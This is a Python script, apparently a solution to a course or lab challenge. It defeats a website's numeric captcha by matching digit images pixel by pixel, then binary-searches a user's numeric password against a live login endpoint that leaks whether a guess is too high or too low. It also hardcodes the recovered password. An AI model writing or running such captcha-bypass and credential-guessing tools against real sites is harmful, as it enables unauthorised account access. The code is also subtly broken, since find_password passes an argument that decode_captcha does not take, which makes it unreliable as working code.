from PIL import Image
from io import BytesIO
import json
from requests.sessions import Session

sessionObject = Session()
lst_number_arrays = list()

def get_numberImages():
    global lst_number_arrays
    for n in range(0, 10):
        ri = sessionObject.get("http://utproject.ir/bp/Numbers/{}.jpg".format(n))
        file = BytesIO(ri.content)
        imgNumber = Image.open(file)
        imgNumber = imgNumber.convert("L")
        array = imgNumber.load()
        lstN = []
        for i in range(imgNumber.size[0]):
            for j in range(imgNumber.size[1]):
                lstN.append(array[i, j])
        lst_number_arrays.append(lstN)

def decode_captcha():
    global lst_number_arrays
    get_numberImages()
    global sessionObject
    rCaptcha = sessionObject.get("http://utproject.ir/bp/image.php")
    fileCaptcha = BytesIO(rCaptcha.content)
    imageCaptcha = Image.open(fileCaptcha)
    imageCaptcha = imageCaptcha.convert("L")

    #imageCaptcha.show()

    x = imageCaptcha.size[0]
    y = imageCaptcha.size[1]
    arr = imageCaptcha.load()
    firstDigit = list()
    secondDigit = list()
    thirdDigit = list()
    fourthDigit = list()
    fifthDigit = list()
    for i in range(0, 40):
        for j in range(y):
            firstDigit.append(arr[i, j])

    for i in range(40, 80):
        for j in range(y):
            secondDigit.append(arr[i, j])

    for i in range(80, 120):
        for j in range(y):
            thirdDigit.append(arr[i, j])

    for i in range(120, 160):
        for j in range(y):
            fourthDigit.append(arr[i, j])

    for i in range(160, 200):
        for j in range(y):
            fifthDigit.append(arr[i, j])
    lstDigits = list()
    lstDigits.append(lst_number_arrays.index(firstDigit))
    lstDigits.append(lst_number_arrays.index(secondDigit))
    lstDigits.append(lst_number_arrays.index(thirdDigit))
    lstDigits.append(lst_number_arrays.index(fourthDigit))
    lstDigits.append(lst_number_arrays.index(fifthDigit))
    captchaAns = lstDigits[-1] + lstDigits[-2]*10 + lstDigits[-3]*100 + lstDigits[-4]*1000 + lstDigits[-5]*10000
    
    return captchaAns

def find_password():
    low = 0
    high = int(10e20)
    password = int((low + high)//2)
    while True:
        captcha = decode_captcha(lst_number_arrays)
        postdata = sessionObject.post("http://utproject.ir/bp/login.php",data={"username":610300087,
            "password":password,"captcha":captcha})
        postdata = json.loads(postdata.content)
        stat = postdata["stat"]

        if stat == 0:
            return password

        elif stat == 1:
            high = password
            password = int((low+high)//2)

        elif stat == -1:
            low = password
            password = int((low+high)//2)

def Login():
    post = sessionObject.post("http://utproject.ir/bp/login.php", data={"username":610300087,
     "password":68448274311422801972})
    return post.status_code



# 68448274311422801972